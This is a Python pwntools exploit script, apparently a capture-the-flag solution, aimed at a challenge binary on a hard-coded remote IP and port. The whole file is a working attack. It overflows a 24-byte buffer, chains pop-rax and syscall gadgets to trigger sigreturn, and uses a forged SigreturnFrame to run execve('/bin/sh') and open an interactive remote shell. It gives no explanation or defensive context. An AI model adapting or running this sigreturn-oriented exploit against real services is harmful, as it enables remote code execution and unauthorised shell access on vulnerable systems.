from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

# ═══════════════════════════════════════
# Configuration
# ═══════════════════════════════════════
binary = './main'
elf = ELF(binary)
p = remote('4.233.210.175',9003)

# ═══════════════════════════════════════
# Gadgets (from your objdump output)
# ═══════════════════════════════════════
echo_rax = 0x4010ce   # pop rax ; ret
echo_call = 0x4010d7  # syscall ; ret

log.success(f"🔊 Echo 1 (pop rax): {hex(echo_rax)}")
log.success(f"🔊 Echo 2 (syscall): {hex(echo_call)}")

# ═══════════════════════════════════════
# Find /bin/sh string in binary
# ═══════════════════════════════════════
try:
    binsh = next(elf.search(b'/bin/sh\x00'))
except StopIteration:
    try:
        binsh = next(elf.search(b'/bin/sh'))
    except StopIteration:
        # From your objdump: /bin/sh is at 0x402000
        binsh = 0x402000
        log.warning(f"Hardcoded /bin/sh address: {hex(binsh)}")

log.success(f"/bin/sh found at: {hex(binsh)}")

# ═══════════════════════════════════════
# Wait for prompt
# ═══════════════════════════════════════
p.recvuntil(b'echoes...')

# ═══════════════════════════════════════
# Build SIGROP payload
# ═══════════════════════════════════════
log.info("Building SIGROP payload...")

offset = 24  # 16 bytes buffer + 8 bytes RBP

payload = b'A' * offset

# Set rax = 15 (sys_rt_sigreturn)
payload += p64(echo_rax)
payload += p64(15)

# Call sigreturn
payload += p64(echo_call)

# Build sigreturn frame for execve
frame = SigreturnFrame()
frame.rax = 59           # sys_execve
frame.rdi = binsh        # pointer to "/bin/sh" 
frame.rsi = 0            # argv = NULL
frame.rdx = 0            # envp = NULL
frame.rip = echo_call    # return to syscall gadget
frame.rsp = 0# safe stack location

payload += bytes(frame)

# ═══════════════════════════════════════
# Send exploit
# ═══════════════════════════════════════
log.info(f"Payload size: {len(payload)} bytes")
log.info("Sending the resonance...")

p.send(payload)

# ═══════════════════════════════════════
# Victory!
# ═══════════════════════════════════════
sleep(0.5)
log.success("=" * 50)
log.success(" The echoes sing together!")
log.success("Shell spawned!")
log.success("=" * 50)

p.interactive()
